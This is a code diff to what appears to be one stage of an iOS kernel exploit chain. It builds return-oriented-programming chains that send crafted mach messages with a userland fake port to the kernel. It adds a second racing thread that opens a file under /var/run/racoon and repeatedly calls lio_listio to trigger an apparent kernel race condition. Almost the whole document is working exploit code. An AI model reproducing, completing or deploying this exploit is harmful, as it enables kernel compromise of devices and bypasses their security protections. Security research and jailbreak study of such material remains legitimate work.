@@ -2,6 +2,7 @@
 #include "rop.h"
 #include "stage3.h"
 #include <mach/mach.h>
+#include <aio.h>
 
 typedef struct {
 	mach_msg_header_t head;
@@ -610,6 +611,7 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	
 	// SETUP VARS
 	char * tmp = malloc(0x1000);
+	DEFINE_ROP_VAR("should_race",sizeof(mach_port_t),tmp); //
 	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
 	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
 	DEFINE_ROP_VAR("the_one",sizeof(mach_port_t),tmp); // the port to which we have a fakeport in userland
@@ -744,6 +746,8 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 		ADD_LOOP_BREAK_IF_X0_NONZERO("main_loop");
 
 	ADD_LOOP_END();
+
+	SET_ROP_VAR64("should_race",1); // stop the other thread
 
 	ROP_VAR_ARG("WEDIDIT",1);
 	CALL("puts",0,0,0,0,0,0,0,0);
@@ -896,6 +900,52 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	// dlopen
 	ROP_VAR_ARG("dylib_str",1);
 	CALL("dlopen",0,0,0,0,0,0,0,0);
+
+	// SECOND THREAD STACK STARTS HERE
+	// FIXME: we need a buffer here otherwise this chain will smash the other stack
+	
+	char * racer_path = malloc(100);
+	snprintf(racer_path,100,"/var/run/racoon/letsgo");
+	DEFINE_ROP_VAR("racer_path",100,racer_path);
+
+	//  int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
+	DEFINE_ROP_VAR("racer_fd",sizeof(int),tmp);
+	ROP_VAR_ARG("racer_path",1);
+	CALL_FUNC_RET_SAVE_VAR("racer_fd",get_addr_from_name("open"),0,O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO,0,0,0,0,0);
+
+	DEFINE_ROP_VAR("aio_list",NENT * 8,tmp);
+	DEFINE_ROP_VAR("aios",NENT * sizeof(struct aiocb),tmp);
+	DEFINE_ROP_VAR("aio_buf",NENT,tmp);
+
+	// TODO: we can optimize this
+	for (uint32_t i = 0; i < NENT; i++) {
+		int offset = sizeof(struct aiocb) * i;
+		ROP_VAR_CPY_W_OFFSET("aios",offset + offsetof(struct aiocb,aio_fildes),"racer_fd",0,4);
+		SET_ROP_VAR32_W_OFFSET("aios",0,offset + offsetof(struct aiocb,aio_offset)); // FIXME: 32 or 64?
+		SET_ROP_VAR64_TO_VAR_W_OFFSET("aios",offset+offsetof(struct aiocb,aio_buf),"aio_buf",i);
+		SET_ROP_VAR32_W_OFFSET("aios",1,offset + offsetof(struct aiocb,aio_nbytes)); // FIXME: 32 or 64?
+		SET_ROP_VAR32_W_OFFSET("aios",LIO_READ,offset + offsetof(struct aiocb,aio_lio_opcode)); // FIXME: 32 or 64?
+		SET_ROP_VAR32_W_OFFSET("aios",SIGEV_NONE,offset + offsetof(struct aiocb,aio_sigevent.sigev_notify)); // FIXME: 32 or 64?
+
+		SET_ROP_VAR64_TO_VAR_W_OFFSET("aio_list",i*8,"aios",offset);
+	}
+
+	//the framework doesn't support inner loops atm, so I hope this works... fingers crossed
+	ADD_LOOP_START("racer_loop");
+		ROP_VAR_ARG("aio_list",2);
+		CALL("lio_listio",LIO_NOWAIT,0,NENT,0,0,0,0,0);
+		
+		// now we would spin and wait till aio completed the list, but that would require another loop
+		// so we just sleep and hope for the best 
+		CALL("usleep",1000,0,0,0,0,0,0,0);
+
+		// set x0 
+		SET_X0_FROM_ROP_VAR("should_race");
+		// break out of the loop if x0 is nonzero
+		ADD_LOOP_BREAK_IF_X0_NONZERO("racer_loop");
+	ADD_LOOP_END();
+
+	CALL("pthread_exit",0,0,0,0,0,0,0,0);
 
 	if (curr_rop_var != NULL) {
 		build_databuffer(offsets,rop_var_top);
